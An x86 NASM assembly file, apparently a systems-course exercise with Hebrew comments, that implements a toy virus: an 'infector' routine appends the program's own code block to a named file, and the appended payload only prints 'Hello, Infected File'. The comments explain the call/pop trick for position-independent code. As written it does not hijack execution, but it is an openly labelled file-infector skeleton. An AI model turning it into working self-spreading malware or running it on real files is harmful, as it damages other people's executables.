section .text
global _start
global system_call
global code_start
global infection
global infector
global code_end
extern main

_start:
    pop     dword ecx    ; ecx = argc
    mov     esi,esp      ; esi = argv
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main      ; call main(argc, argv, envp)

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             
    mov     ebp, esp
    sub     esp, 4          
    pushad                  

    mov     eax, [ebp+8]    ; sys_call_num        
    mov     ebx, [ebp+12]   ; arg1
    mov     ecx, [ebp+16]   ; arg2
    mov     edx, [ebp+20]   ; arg3
    int     0x80            
    mov     [ebp-4], eax    
    popad                   
    mov     eax, [ebp-4]    
    add     esp, 4          
    pop     ebp             
    ret                     



code_start:

infection:
    push    ebp
    mov     ebp, esp
    pushad

    mov     eax, 4              ; sys_write
    mov     ebx, 1              ; stdout
    
    ; טריק קריטי למיקום עצמאי (Position Independent Code):
    ; כשהקוד הזה יידבק לקובץ אחר, הכתובת האבסולוטית של המחרוזת תשתנה.
    ; בעזרת call אנחנו דוחפים למחסנית את הכתובת האמיתית בריצה ברגע זה!
    call    .get_string_addr
    db "Hello, Infected File", 10
.get_string_addr:
    pop     ecx                ; get the actual address of the string into ecx
    mov     edx, 21            ; the length of the string "Hello, Infected File\n"
    int     0x80                

    popad
    mov     esp, ebp
    pop     ebp
    ret

infector: ;open -> write virus -> close
    push    ebp
    mov     ebp, esp
    pushad

    mov     ebx, [ebp+8]        ; char *filename in arg

    ;  sys_open(filename, O_WRONLY- | O_APPEND, 0) -writ only, wrtit to end only
    mov     eax, 5              ; sys_open
    mov     ecx, 0x401          ;  append | write only
    mov     edx, 0              
    int     0x80
    mov     esi, eax            ; save the file before writing to it           

    ; sys_write(fd, code_start, code_end - code_start)
    mov     eax, 4              ; sys_write
    mov     ebx, esi            ; the wanted file
    mov     ecx, code_start     ; start point of the code to write
    mov     edx, code_end - code_start ; length of the code to write
    int     0x80

    ; sys_close(fd) - eax=6, ebx=fd
    mov     eax, 6              
    mov     ebx, esi         
    int     0x80

    popad
    mov     esp, ebp
    pop     ebp
    ret


code_end: